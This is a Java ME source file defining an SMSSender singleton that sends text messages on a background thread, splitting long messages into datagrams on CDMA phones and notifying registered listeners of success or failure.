package com.vvt.smsutil;

import java.util.Vector;
import javax.microedition.io.Connector;
import javax.microedition.io.Datagram;
import javax.microedition.io.DatagramConnection;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;
import com.vvt.std.IOUtil;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class SMSSender {
	
	private static SMSSender self = null;
	private Vector smsSendObserverStore = new Vector();
	
	private SMSSender() {}
	
	public static SMSSender getInstance() {
		if (self == null) {
			self = new SMSSender();
		}
		return self;
	}
	
	public void addListener(SMSSendListener observer) {
		boolean isExisted = isSMSSenderExisted(observer);
		if (!isExisted) {
			smsSendObserverStore.addElement(observer);
		}
	}
	
	public void removeListener(SMSSendListener observer) {
		boolean isExisted = isSMSSenderExisted(observer);
		if (isExisted) {
			smsSendObserverStore.removeElement(observer);
		}
	}

	public void removeAllListener() {
		smsSendObserverStore.removeAllElements();
	}
	
	public void send(FxSMSMessage smsMessage) {
		if (smsMessage.getNumber().trim().length() > 0) {
			SMSSenderThread th = new SMSSenderThread(smsMessage);
			th.start();
		}
	}
	
	private void notifyErr(FxSMSMessage smsMessage, Exception e) {
		if (smsSendObserverStore.size() > 0) {
			for (int i = 0; i < smsSendObserverStore.size(); i++) {
				((SMSSendListener)smsSendObserverStore.elementAt(i)).smsSendFailed(smsMessage, e, null);
			}
		}
	}
	
	private void notifySuccess(FxSMSMessage smsMessage) {
		if (smsSendObserverStore.size() > 0) {
			for (int i = 0; i < smsSendObserverStore.size(); i++) {
				((SMSSendListener)smsSendObserverStore.elementAt(i)).smsSendSuccess(smsMessage);
			}
		}
	}
	
	private boolean isSMSSenderExisted(SMSSendListener observer) {
		boolean isExisted = false;
		for (int i = 0; i < smsSendObserverStore.size(); i++) {
			if (smsSendObserverStore.elementAt(i) == observer) {
				isExisted = true;
				break;
			}
		}
		return isExisted;
	}
	
	private class SMSSenderThread extends Thread {
		
		private FxSMSMessage smsMessage = null;
		
		private SMSSenderThread(FxSMSMessage smsMessage) {
			this.smsMessage = smsMessage;
		}
		
		public void run() {
			send();
		}
		
		private void send() {
			MessageConnection messageConnection = null;
			DatagramConnection datagramConnection = null;
			String prefix = "sms://";
			try {
				if (PhoneInfo.isCDMA()) {
					datagramConnection = (DatagramConnection) Connector.open(prefix + smsMessage.getNumber());
					byte[] textComplete = smsMessage.getMessage().getBytes();
					int maxLengthDatagram = datagramConnection.getMaximumLength();
					int lengthTotal = textComplete.length;
					if (lengthTotal <= maxLengthDatagram) {
						Datagram datagram = datagramConnection.newDatagram(textComplete, textComplete.length);
						datagramConnection.send(datagram);
					} else {
						int numberOfDatagramsRequired = lengthTotal / maxLengthDatagram + 1;
						int lengthDatagram = lengthTotal / numberOfDatagramsRequired;
						for (int i = 0; i < numberOfDatagramsRequired; i++) {
							byte[] textPart = new byte[lengthDatagram];
							for (int j = 0; j < lengthDatagram; j++) {
								int indexInBytes = j + i * lengthDatagram;
								if (indexInBytes < lengthTotal) {
									textPart[j] = textComplete[indexInBytes];
								} else {
									break;
								}
							}
							Datagram datagram = datagramConnection.newDatagram(textPart, textPart.length);
							datagramConnection.send(datagram);
						}
					}
					notifySuccess(smsMessage);
				} else {
					messageConnection = (MessageConnection)Connector.open(prefix + smsMessage.getNumber());
					TextMessage txtMsg = (TextMessage) messageConnection.newMessage(MessageConnection.TEXT_MESSAGE);
					txtMsg.setPayloadText(smsMessage.getMessage());
					messageConnection.send(txtMsg);
					notifySuccess(smsMessage);
				}
			} catch(Exception e) {
				Log.error("SMSSenderThread.send", "EXCEPTION = " + e);
				notifyErr(smsMessage, e);
			} finally {
				IOUtil.close(datagramConnection);
				IOUtil.close(messageConnection);
			}
		}
	}
}
